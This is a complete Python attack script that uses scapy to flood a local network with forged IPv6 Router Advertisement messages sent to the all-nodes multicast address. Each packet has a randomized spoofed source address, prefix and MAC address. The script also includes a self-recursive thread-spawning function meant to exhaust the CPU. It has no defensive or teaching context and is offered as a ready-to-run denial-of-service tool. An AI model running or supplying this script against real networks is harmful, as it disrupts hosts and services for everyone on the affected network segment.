#!/usr/bin/python
import random
from threading import Thread
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, ICMPv6NDOptSrcLLAddr
from scapy.sendrecv import srflood, send


# Stress the CPU
def CPU():
    Thread(target=CPU).start()
    CPU()

print("Flooding the network with RA messages.")

# Generate packets
while True:
    base = IPv6()
    base.dst = "ff02::1"
    M = 16 ** 4
    base.src = "fe80::dead:" + ":".join(("%x" % random.randint(0, M)
                                         for j in range(4)))
    random_prefix = "2001:dead:" + ":".join(("%x" % random.randint(0, M)
                                             for k in range(2))) + "::"
    random_mac = "02:03:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                              random.randint(0, 255),
                                              random.randint(0, 255))
    packet1 = base / ICMPv6ND_RA(prf="High", routerlifetime=2048) / \
              ICMPv6NDOptPrefixInfo(prefixlen=64,
                                    validlifetime=0x12c,
                                    preferredlifetime=0x6,
                                    prefix=random_prefix) / \
              ICMPv6NDOptSrcLLAddr(lladdr=random_mac)
    send(packet1, verbose=False)
    CPU()

